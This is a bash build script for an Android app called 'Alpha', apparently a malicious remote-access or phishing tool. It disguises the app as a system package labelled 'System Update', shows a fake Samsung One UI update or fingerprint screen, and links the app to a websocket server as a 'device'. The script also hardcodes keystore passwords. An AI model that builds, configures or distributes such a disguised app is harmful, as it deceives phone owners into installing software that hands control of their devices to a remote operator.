#!/usr/bin/env bash
# Alpha APK builder — edit variables below then run: chmod +x build.sh && ./build.sh
set -e

##############################################################################
# CUSTOMIZE THESE
##############################################################################

SERVER_URL="wss://your-server.com/ws?role=device&id="
TARGET_URL="https://google.com"

APP_ID="com.android.media.core"
APP_LABEL="System Update"

# Fake screen: 0=none  1=system update  2=fingerprint update
UPDATE_MODE=1
UPDATE_BRAND="Samsung"
UPDATE_TITLE="Software update"
UPDATE_VERSION="One UI 6.1"
UPDATE_DURATION_MS=10000

KEYSTORE_PATH="../alpha-release.jks"
KEYSTORE_PASS="AlphaRelease2024"
KEY_ALIAS="alpha-key"
KEY_PASS="AlphaRelease2024"

VERSION_CODE=10001
VERSION_NAME="1.0.0"

##############################################################################

cd android-alpha

./gradlew assembleRelease \
  -PAPP_ID="${APP_ID}" \
  -PAPP_LABEL="${APP_LABEL}" \
  -PSERVER_URL="${SERVER_URL}" \
  -PTARGET_URL="${TARGET_URL}" \
  -PUPDATE_MODE="${UPDATE_MODE}" \
  -PUPDATE_BRAND="${UPDATE_BRAND}" \
  -PUPDATE_TITLE="${UPDATE_TITLE}" \
  -PUPDATE_VERSION="${UPDATE_VERSION}" \
  -PUPDATE_DURATION_MS="${UPDATE_DURATION_MS}" \
  -PKEYSTORE_PATH="${KEYSTORE_PATH}" \
  -PKEYSTORE_PASS="${KEYSTORE_PASS}" \
  -PKEY_ALIAS="${KEY_ALIAS}" \
  -PKEY_PASS="${KEY_PASS}" \
  -PVERSION_CODE="${VERSION_CODE}" \
  -PVERSION_NAME="${VERSION_NAME}"

echo ""
echo "Build complete:"
find app/build/outputs/apk/release -name "*.apk" -exec ls -lh {} \;
